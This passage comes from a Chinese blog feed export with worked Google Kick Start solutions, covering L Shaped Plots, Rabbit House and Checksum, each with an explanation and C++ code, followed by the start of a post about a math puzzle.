<span class="keyword">if</span>(str[i] == str[n<span class="number">-1</span>-i]) good++;</span><br><span class="line">        <span class="keyword">else</span> bad++;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;<span class="built_in">abs</span>(k-bad)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="L-Shaped-Plots-8pts-12pts"><a href="#L-Shaped-Plots-8pts-12pts" class="headerlink" title="L Shaped Plots (8pts, 12pts)"></a>L Shaped Plots (8pts, 12pts)</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/03/26/3TnVvd1utlzsgqR.png"><br>求出给定的矩阵中<code>L</code>的个数，<code>L</code>形要求：</p>
<ul>
<li><code>L</code>的两个线段必须分别在一行和一列，两个线段必须必须与行、列平行；</li>
<li><code>L</code>的两个线段有且只有一个点相交，且一条线段的长度为另一条线段的长度的两倍；</li>
<li><code>L</code>的两个线段的长度必须大于等于<code>2</code>;</li>
</ul>
<h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000436140/000000000068c509">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000436140/000000000068c509</a></p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 滑动窗口 + 前缀和</p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>我们分别求出以点<code>(x,y)</code>为起点，分别往上下左右四个方向的最长的连续的<code>1</code>的长度。</li>
<li>分别求出以点<code>(x,y)</code>为起点相交顶点的<code>L</code>的个数，分别在上下左右四个方向求一边，我们设<code>L</code>的两个线段的长度分别为$m,n$,则以<code>m,n</code>为长度的两个线段可能组成的<code>L</code>的形状个数为：<br>$$<br>cnt &#x3D; max(0,min(m&#x2F;2,n)-1) + max(0,min(m,n&#x2F;2)-1)<br>$$</li>
<li>时间复杂度$O(m<em>n)$,空间复杂度$O(m</em>n)$.</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> row;</span><br><span class="line">    <span class="type">int</span> col;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;row&gt;&gt;col;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">matrix</span>(row,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col));</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">left</span>(row,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col));</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">right</span>(row,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col));</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">down</span>(row,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col));</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">up</span>(row,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">            cin&gt;&gt;matrix[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">        <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(matrix[i][j] == <span class="number">1</span>) curr++;</span><br><span class="line">            <span class="keyword">else</span> curr = <span class="number">0</span>;</span><br><span class="line">            left[i][j] = curr;</span><br><span class="line">        &#125;</span><br><span class="line">        curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = col<span class="number">-1</span>; j &gt;= <span class="number">0</span>; --j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(matrix[i][j] == <span class="number">1</span>) curr++;</span><br><span class="line">            <span class="keyword">else</span> curr = <span class="number">0</span>;</span><br><span class="line">            right[i][j] = curr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">         <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(matrix[i][j] == <span class="number">1</span>) curr++;</span><br><span class="line">            <span class="keyword">else</span> curr = <span class="number">0</span>;</span><br><span class="line">            up[i][j] = curr;</span><br><span class="line">        &#125;</span><br><span class="line">        curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = row<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(matrix[i][j] == <span class="number">1</span>) curr++;</span><br><span class="line">            <span class="keyword">else</span> curr = <span class="number">0</span>;</span><br><span class="line">            down[i][j] = curr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="built_in">min</span>(left[i][j],up[i][j]/<span class="number">2</span>) - <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="built_in">min</span>(left[i][j]/<span class="number">2</span>,up[i][j]) - <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="built_in">min</span>(right[i][j],up[i][j]/<span class="number">2</span>) - <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="built_in">min</span>(right[i][j]/<span class="number">2</span>,up[i][j]) - <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="built_in">min</span>(left[i][j],down[i][j]/<span class="number">2</span>) - <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="built_in">min</span>(left[i][j]/<span class="number">2</span>,down[i][j]) - <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="built_in">min</span>(right[i][j],down[i][j]/<span class="number">2</span>) - <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="built_in">min</span>(right[i][j]/<span class="number">2</span>,down[i][j]) - <span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Rabbit-House-9pts-15pts"><a href="#Rabbit-House-9pts-15pts" class="headerlink" title="Rabbit House (9pts, 15pts)"></a>Rabbit House (9pts, 15pts)</h2><p><img src="https://i.loli.net/2021/03/26/o8TjBu3RcAtbyVp.png"><br>这个题目跟<code>leetcode</code>上的那个容器的题目很像，所以是中规中矩的题目，不算很难，靠自己还能思考出来。</p>
<h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000436140/000000000068cb14">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000436140/000000000068cb14</a></p>
<h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 优先级队列</p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol>
<li>我们将矩阵中所有单元的高度按照从高到底依次排列，每次从队列中取除当前高度最高的单元$(x,y)$,高度为$h$,则此时必须满足$(x,y)$周围的四个格子$(x-1,y),(x+1,y),(x,y+1),(x,y-1)$必须要大于等于$h-1$,如果当前格子的高度发生改变则将其从新放入队列中。</li>
<li>非常简单的优先级对即可解决，时间复杂度为$O(m<em>nlg(m</em>n))$,空间复杂度为$O(m*n)$.</li>
</ol>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="built_in">Node</span>(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">        <span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">        <span class="keyword">this</span>-&gt;val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cmp</span>&#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(Node &amp; a,Node &amp; b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.val &lt; b.val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> row;</span><br><span class="line">    <span class="type">int</span> col;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> d[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">    cin&gt;&gt;row&gt;&gt;col;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">matrix</span>(row,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(col));</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">visit</span>(row,<span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(col,<span class="literal">false</span>));</span><br><span class="line">    priority_queue&lt;Node,vector&lt;Node&gt;,cmp&gt; pq;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">            cin&gt;&gt;matrix[i][j];</span><br><span class="line">            pq.<span class="built_in">push</span>(&#123;i,j,matrix[i][j]&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!pq.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        Node curr = pq.<span class="built_in">top</span>();</span><br><span class="line">        pq.<span class="built_in">pop</span>();</span><br><span class="line">        visit[curr.x][curr.y] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(curr.val != matrix[curr.x][curr.y]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)&#123;</span><br><span class="line">            <span class="type">int</span> x = curr.x + d[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> y = curr.y + d[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(x &lt; <span class="number">0</span> || y &lt; <span class="number">0</span> || x &gt;= row || y &gt;= col) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(visit[x][y]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(matrix[x][y] &lt; curr.val - <span class="number">1</span>)&#123;</span><br><span class="line">                ans += curr.val - <span class="number">1</span> - matrix[x][y];</span><br><span class="line">                matrix[x][y] = curr.val - <span class="number">1</span>;</span><br><span class="line">                pq.<span class="built_in">push</span>(&#123;x,y,matrix[x][y]&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            visit[x][y] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Checksum-10pts-17pts-17pts"><a href="#Checksum-10pts-17pts-17pts" class="headerlink" title="Checksum (10pts, 17pts, 17pts)"></a>Checksum (10pts, 17pts, 17pts)</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/03/26/L8D2wuAkR5f6B3p.png"><br>给定矩阵和每行每列的异或校验和，求恢复矩阵所需要的最小代价。</p>
<h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000436140/000000000068c2c3">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000436140/000000000068c2c3</a></p>
<h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>最小生成树</p>
</blockquote>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>这个题目还是非常难的，根本不容易想到，我们首先将已经恢复的单元视作代价为$0$的未恢复的单元。</li>
<li>首先我们需要想到一个问题，思考一下我们至少需要恢复多少个单元，才能将所有的单元全部恢复，这个就是一个非常值得思考得问题，我们仔细想一下，因为已知每一行所有元素得异或校验和，则我们如果已经知道每一行的$n-1$个值，则我们就能通过校验和计算最后一个未知的数，对于每一列同样也是如此，所以我们可以猜测一下，我们至少需要恢复$(n-1)^{2}$个数据，才能完成所有的$n^{2}$数据恢复。</li>
</ol>
<ul>
<li>我们可以计算一下，如果恢复的元素超过$(n-1)^{2}$个，则我们可以计算出肯定存在某一行或者某一列恢复的数据为$n$个，这个对于我们来说是不必要的。</li>
<li>如果恢复的数据少于$(n-1)^{2}$,则此时我们还至少需要恢复$2*N$个数据，而我们实际上根据异或的校验和，至多能够推导出$2N-1$个数据。</li>
</ul>
<ol start="3">
<li>根据以上推论，我们可以知道可以知道选择出最大的未解的$2n-1$个数据，剩余的$(n-1)^{2}$的数据恢复则花费的代价可能最小。如何选择$2n-1$个数据呢？假设我们按照以下顺序通过校验和来恢复最后剩余的$(2n-1)$个数据，顺序为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0 0 9 0 8</span><br><span class="line">0 2 0 0 3 0</span><br><span class="line">0 0 5 0 4 0</span><br><span class="line">0 1 0 0 0 0 </span><br><span class="line">0 0 6 0 0 7</span><br><span class="line">11 0 0 10 0 0</span><br></pre></td></tr></table></figure>
$1 \rightarrow 2 \rightarrow 3 \rightarrow 4\rightarrow 5\rightarrow 6\rightarrow 7\rightarrow 8\rightarrow 9\rightarrow 10 \rightarrow 11$<br>我们实际可以知道将行与列分别看成生成树中的两个顶点，我们实际可以看出由行与列组成成的图不能有环，如果存在环的话，则一定存在某一行或者某一列中有两个未知数，则此时就不可能恢复该行或者该列的元素。</li>
<li>根据以上得出我们只需要选出边与行的顶点组成的最大生成树，可以用<code>prim</code>或者<code>Kruskal</code>算法即可。因为在此图中一个顶点连接的边很多，此时明显我们用<code>prim</code>算法的时间复杂度更好。</li>
<li>代码直接<code>copy lucifer</code>的。</li>
</ol>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">using</span> ll = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">  x = <span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> c = <span class="built_in">getchar</span>();</span><br><span class="line">  T sig = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (; !<span class="built_in">isdigit</span>(c); c = <span class="built_in">getchar</span>())</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">      sig = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> (; <span class="built_in">isdigit</span>(c); c = <span class="built_in">getchar</span>())</span><br><span class="line">    x = (x &lt;&lt; <span class="number">3</span>) + (x &lt;&lt; <span class="number">1</span>) + c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  x *= sig;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span> &#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; parent, size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">UnionFind</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">    parent = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n);</span><br><span class="line">    size = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">      parent[i] = i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (parent[idx] == idx)</span><br><span class="line">      <span class="keyword">return</span> idx;</span><br><span class="line">    <span class="keyword">return</span> parent[idx] = <span class="built_in">find</span>(parent[idx]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> fa = <span class="built_in">find</span>(a), fb = <span class="built_in">find</span>(b);</span><br><span class="line">    <span class="keyword">if</span> (fa != fb) &#123;</span><br><span class="line">      <span class="keyword">if</span> (size[fa] &gt; size[fb]) &#123;</span><br><span class="line">        parent[fb] = fa;</span><br><span class="line">        size[fa] += size[fb];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        parent[fa] = fb;</span><br><span class="line">        size[fb] += size[fa];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> case_num)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Case #%d: &quot;</span>, case_num);</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">read</span>(n);</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">a</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">b</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">r</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">c</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j)</span><br><span class="line">        <span class="built_in">read</span>(a[i][j]);</span><br><span class="line"></span><br><span class="line">    vector&lt;tuple&lt;<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>&gt;&gt; edges;</span><br><span class="line">    ll tot = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">        <span class="built_in">read</span>(b[i][j]);</span><br><span class="line">        tot += b[i][j];</span><br><span class="line">        edges.<span class="built_in">emplace_back</span>(b[i][j], i, n + j);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="built_in">sort</span>(edges.<span class="built_in">rbegin</span>(), edges.<span class="built_in">rend</span>());</span><br><span class="line">    <span class="function">UnionFind <span class="title">uf</span><span class="params">(n * <span class="number">2</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">      <span class="built_in">read</span>(r[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">      <span class="built_in">read</span>(c[i]);</span><br><span class="line"></span><br><span class="line">    ll remove = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> [weight, u, v] : edges) &#123;</span><br><span class="line">      <span class="keyword">if</span> (uf.<span class="built_in">find</span>(u) == uf.<span class="built_in">find</span>(v))</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      remove += weight;</span><br><span class="line">      uf.<span class="built_in">connect</span>(u, v);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, tot - remove);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">  cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> t;</span><br><span class="line">  <span class="built_in">read</span>(t);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= t; ++i) &#123;</span><br><span class="line">    Solution solution = <span class="built_in">Solution</span>();</span><br><span class="line">    solution.<span class="built_in">solve</span>(i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>kickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>【数学】  数学题目</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/78/</url>
    <content><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>在知乎上偶尔看到一道初中数学题目，所以觉得非常有意思，专门拿出来讨论下。<br><img src="https://i.loli.net/2021/01/05/1EapTUuz9iZXMmw.png" alt="1"></p>
